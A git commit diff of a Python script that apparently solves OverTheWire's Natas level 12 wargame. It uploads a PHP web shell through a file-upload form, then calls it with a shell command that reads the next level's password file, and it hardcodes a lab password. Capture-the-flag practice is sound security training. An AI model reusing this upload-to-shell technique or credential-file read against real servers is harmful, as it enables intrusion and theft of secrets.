32d5244809320be8a324e68fd2d1920659792375
Romain <rmtestard@gmail.com>
2019-02-04 08:30:11 +0100

    File upload Remote Code Execution

--- natas12.py
+++ natas12.py
@@ -8,12 +8,15 @@ password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'
 
 url = 'http://%s.natas.labs.overthewire.org/' % username
 
-# response = requests.get(url, auth=(username, password))
-# response = requests.post(url, files = {'uploadedfile' : open('natas12.php', 'rb')}, data = {'filename': 'natas12.php', 'MAX_FILE_SIZE': '1000'}, auth=(username, password))
+# response = requests.get(url + 'index-source.html', auth=(username, password))
+# response = requests.post(url, files={'uploadedfile': open('natas12.php', 'rb')}, data={
+#                          'filename': 'natas12.php', 'MAX_FILE_SIZE': '1000'}, auth=(username, password))
 session = requests.Session()
-response = session.get(url + 'upload/umde6zpk53.php?c= cat /etc/natas_webpass/natas13', auth = (username, password))
+response = session.get(url + 'upload/cua60fuj7k.php?c= cat /etc/natas_webpass/natas13', auth = (username, password))
 
 content = response.text
+output = open('output.html', 'w')
+output.write(content)
 
 print(content)
 # print(re.findall('The password for natas9 is (.*)', content))
